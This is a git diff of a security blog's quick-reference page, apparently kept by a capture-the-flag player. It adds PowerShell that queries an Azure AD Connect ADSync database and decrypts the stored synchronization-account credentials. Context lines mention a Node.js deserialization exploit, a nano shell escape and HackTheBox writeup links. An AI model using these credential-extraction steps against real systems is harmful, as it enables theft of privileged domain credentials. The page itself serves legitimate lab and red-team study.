@@ -2,8 +2,33 @@
 title: "Highlights"
 date: 2020-01-03T20:06:24-05:00
 draft: false
-description: "Node.js deserialization exploit | Fully Interactive TTY | Nano Escape | Python RCE"
+description: "Noteable Blog Highlights and Quick-References"
 ---
+
+# Attacking Azure AD Password Hash Synchronization
+
+**Key Reference:**   
+https://blog.xpnsec.com/azuread-connect-for-redteam/
+
+```powershell
+Invoke-SQLCMD -Query "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration" -ServerInstance "MONTEVERDE" -Database "ADSync"
+
+Invoke-SQLCMD -Query "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent" -ServerInstance "MONTEVERDE" -Database "ADSync"
+```
+
+```powershell
+add-type -path "C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll"
+$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
+$km.LoadKeySet($entropy, $instance_id, $key_id)
+$key = $null
+$km.GetActiveCredentialKey([ref]$key)
+$key2 = $null
+$km.GetKey(1, [ref]$key2)
+$decrypted = $null
+$key2.DecryptBase64ToString($crypted, [ref]$decrypted)
+```  
+
+
 
 # Node.js deserialization exploit  
 
@@ -56,10 +81,10 @@ Reset; sh 1>&0 2>&0
 _Where ^R^X is ctrl+R and ctrl+X._
 
 # HTB Writeups
+[KringleCon 2019](https://medium.com/@rob.mccarthy31/kringlecon-2019-write-up-ca83081a330)
 [OpenAdmin](../../post/htb/openadmin)
 [Postman](../../post/htb/postman)
 [Craft](../../post/htb/craft)
 [Sneaky - Coming Soon](../../post/htb/sneaky)
 [Traverxec - Coming Soon](../../post/htb/traverxec)
 
-![test image](/img/craft/developer.png)
